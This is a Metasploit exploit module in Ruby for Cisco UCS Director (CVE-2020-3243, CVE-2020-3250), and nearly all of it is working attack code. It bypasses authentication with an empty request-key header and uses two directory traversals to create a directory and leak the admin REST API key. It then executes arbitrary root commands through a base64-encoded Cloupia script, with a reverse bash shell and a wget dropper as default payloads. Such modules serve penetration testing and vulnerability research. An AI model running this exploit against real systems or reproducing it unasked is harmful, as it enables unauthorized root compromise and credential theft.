# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Cisco UCS Director Cloupia Script RCE&#039;,
        &#039;Description&#039; => %q{
          This module exploits an authentication bypass and directory traversals
          in Cisco UCS Director < 6.7.4.0 to leak the administrator&#039;s REST API
          key and execute a Cloupia script containing an arbitrary root command.

          Note that the primary functionality of this module is to leverage the
          of the application&#039;s intended operation and considered a "foreverday."
          The authentication bypass and directory traversals only get us there.

          If you already have an API key, you may set it in the API_KEY option.
          The LEAK_FILE option may be set if you wish to leak the API key from a
          different absolute path, but normally this isn&#039;t advisable.

          Tested on Cisco&#039;s VMware distribution of 6.7.3.0.
        },
        &#039;Author&#039; => [
          &#039;mr_me&#039;, # Discovery and exploit
          &#039;wvu&#039; # Module
        ],
        &#039;References&#039; => [
          [&#039;CVE&#039;, &#039;2020-3243&#039;], # X-Cloupia-Request-Key auth bypass
          [&#039;CVE&#039;, &#039;2020-3250&#039;], # Directory traversal #2 (userAPIDownloadFile)
          [&#039;ZDI&#039;, &#039;20-540&#039;], # X-Cloupia-Request-Key auth bypass
          [&#039;ZDI&#039;, &#039;20-538&#039;], # Directory traversal #2 (userAPIDownloadFile)
          [&#039;URL&#039;, &#039;https://srcincite.io/blog/2020/04/17/strike-three-symlinking-your-way-to-unauthenticated-access-against-cisco-ucs-director.html&#039;],
          [&#039;URL&#039;, &#039;https://srcincite.io/pocs/src-2020-0014.py.txt&#039;]
        ],
        &#039;DisclosureDate&#039; => &#039;2020-04-15&#039;, # Vendor advisory
        &#039;License&#039; => MSF_LICENSE,
        &#039;Platform&#039; => [&#039;unix&#039;, &#039;linux&#039;],
        &#039;Arch&#039; => [ARCH_CMD, ARCH_X86, ARCH_X64],
        &#039;Privileged&#039; => true,
        &#039;Targets&#039; => [
          [
            &#039;Unix Command&#039;,
            &#039;Platform&#039; => &#039;unix&#039;,
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Type&#039; => :unix_command,
            &#039;DefaultOptions&#039; => {
              &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_bash&#039;
            }
          ],
          [
            &#039;Linux Dropper&#039;,
            &#039;Platform&#039; => &#039;linux&#039;,
            &#039;Arch&#039; => [ARCH_X86, ARCH_X64],
            &#039;Type&#039; => :linux_dropper,
            &#039;DefaultOptions&#039; => {
              &#039;CMDSTAGER::FLAVOR&#039; => &#039;wget&#039;,
            }
          ]
        ],
        &#039;DefaultTarget&#039; => 1,
        &#039;DefaultOptions&#039; => {
          &#039;SSL&#039; => true
        },
        &#039;Notes&#039; => {
          &#039;Stability&#039; => [CRASH_SAFE],
          &#039;Reliability&#039; => [REPEATABLE_SESSION],
          &#039;SideEffects&#039; => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      Opt::RPORT(443),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path&#039;, &#039;/&#039;]),
      OptString.new(&#039;API_KEY&#039;, [false, &#039;API key if you have it&#039;]),
      OptString.new(
        &#039;LEAK_FILE&#039;,
        [
          true,
          &#039;Leak API key from this file (absolute path)&#039;,
          &#039;/opt/infra/idaccessmgr/logfile.txt&#039;
        ]
      )
    ])

    # XXX: https://github.com/rapid7/metasploit-framework/issues/12963
    import_target_defaults
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/app/ui/login.jsp&#039;)
    )

    unless res
      return CheckCode::Unknown(&#039;Target did not respond to check request.&#039;)
    end

    unless res.code == 200 && res.body.include?(&#039;Cisco UCS Director&#039;)
      return CheckCode::Unknown(&#039;Target is not running Cisco UCS Director.&#039;)
    end

    CheckCode::Detected(&#039;Target is running Cisco UCS Director.&#039;)
  end

  def exploit
    unless datastore[&#039;LEAK_FILE&#039;].start_with?(&#039;/&#039;)
      fail_with(Failure::BadConfig, &#039;LEAK_FILE is not an absolute path&#039;)
    end

    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    # Randomly named file is never written to the exports directory
    create_exports_dir(
      &#039;/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports&#039;,
      rand_text_alphanumeric(8..42)
    )

    if (@api_key = datastore[&#039;API_KEY&#039;])
      print_status("User-specified API key: #{@api_key}")
    else
      leak_api_key(datastore[&#039;LEAK_FILE&#039;])
    end

    print_status("Executing #{target.name} for #{datastore[&#039;PAYLOAD&#039;]}")

    case target[&#039;Type&#039;]
    when :unix_command
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

  def create_exports_dir(*path_parts)
    path = normalize_uri(path_parts)

    mime = Rex::MIME::Message.new
    mime.add_part(
      Faker::Hacker.say_something_smart, # data
      &#039;text/plain&#039;, # content_type
      nil, # transfer_encoding
      %(form-data; name="#{rand_text_alphanumeric(8..42)}"; ) +
        # Directory traversal #1:
        #   /opt/infra/uploads/ApiUploads/../../../../foo/bar -> /foo/bar
        %(filename="../../../..#{path}") # content_disposition
    )

    print_status(&#039;Creating exports directory&#039;)

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/cloupia/api/rest&#039;),
      &#039;headers&#039; => {
        &#039;X-Cloupia-Request-Key&#039; => &#039;&#039; # Auth bypass
      },
      &#039;ctype&#039; => "multipart/form-data; boundary=#{mime.bound}",
      &#039;vars_get&#039; => {
        &#039;opName&#039; => &#039;userAPI:userAPIUnifiedImport&#039;,
        &#039;opData&#039; => &#039;{}&#039;
      },
      &#039;data&#039; => mime.to_s
    )

    unless res
      fail_with(Failure::Unknown, "Target did not respond to #{__method__}")
    end

    # It will always return 200, even on error
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Target returned #{res.code} code")
    end

    # It will always return this error, despite creating the directory!
    unless res.body.include?(&#039;Cannot execute operation&#039;)
      fail_with(Failure::NotVulnerable, &#039;Could not create exports directory&#039;)
    end

    print_good(&#039;Successfully created exports directory&#039;)
  end

  def leak_api_key(*path_parts)
    path = normalize_uri(path_parts)

    print_status("Leaking API key from #{path}")

    # TODO: Chunk this!
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/cloupia/api/rest&#039;),
      &#039;headers&#039; => {
        &#039;X-Cloupia-Request-Key&#039; => &#039;&#039; # Auth bypass
      },
      &#039;vars_get&#039; => {
        &#039;opName&#039; => &#039;userAPI:userAPIDownloadFile&#039;,
        &#039;opData&#039; => {
          # Directory traversal #2:
          #   /opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/../../../../../../../../foo/bar -> /foo/bar
          &#039;param0&#039; => "../../../../../../../..#{path}"
        }.to_json
      },
      &#039;partial&#039; => true
    )

    unless res
      fail_with(Failure::Unknown, "Target did not respond to #{__method__}")
    end

    # It will always return 200, even on error
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Target returned #{res.code} code")
    end

    # There is no spoon
    if res.body.include?(&#039;There is no file with the name&#039;)
      fail_with(Failure::NotFound, "#{path} does not exist")
    end

    # An empty body may indicate permission denied
    if res.body.empty?
      fail_with(Failure::UnexpectedReply, "#{path} is empty or unreadable")
    end

    vprint_good("Successfully dumped #{path}")

    @api_key =
      res.body.scan(/"loginName":"admin".+"restKey":"(\h+)"/).flatten.first

    unless @api_key
      fail_with(Failure::NoAccess, &#039;Could not find API key&#039;)
    end

    print_good("Found API key: #{@api_key}")
  end

  def execute_command(cmd, _opts = {})
    vprint_status("Executing command: #{cmd}")

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/cloupia/api-v2/generalActions&#039;),
      &#039;headers&#039; => {
        &#039;X-Cloupia-Request-Key&#039; => @api_key
      },
      &#039;ctype&#039; => &#039;text/xml&#039;,
      &#039;data&#039; => cloupia_script(cmd)
    )

    unless res
      fail_with(Failure::Unknown, "Target did not respond to #{__method__}")
    end

    # It will always return 200, even on error
    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Target returned #{res.code} code")
    end

    # Just like Unix, a status of 0 indicates success
    unless res.body.include?(&#039;<operationStatus>0</operationStatus&#039;)
      fail_with(Failure::PayloadFailed, "Could not execute command: #{cmd}")
    end

    print_good("Successfully executed command: #{cmd}")
  end

  def cloupia_script(cmd)
    # https://docs.oracle.com/javase/8/docs/api/java/util/Base64.Decoder.html
    script = <<~JAVA.tr("\n", &#039;&#039;)
      new java.lang.ProcessBuilder(
        "bash",
        "-c",
        new java.lang.String(
          java.util.Base64.getDecoder().decode(
            "#{Rex::Text.encode_base64(cmd)}"
          )
        )
      ).start();
    JAVA

    <<~XML
      <?xml version="1.0" encoding="UTF-8"?>
      <cuicOperationRequest>
        <operationType>EXECUTE_CLOUPIA_SCRIPT</operationType>
        <payload>
          <![CDATA[
            <ExecuteCloupiaScript>
              <label>#{rand_text_alphanumeric(8..42)}</label>
              <script>#{script.encode(xml: :text)}</script>
            </ExecuteCloupiaScript>
          ]]>
        </payload>
      </cuicOperationRequest>
    XML
  end

end

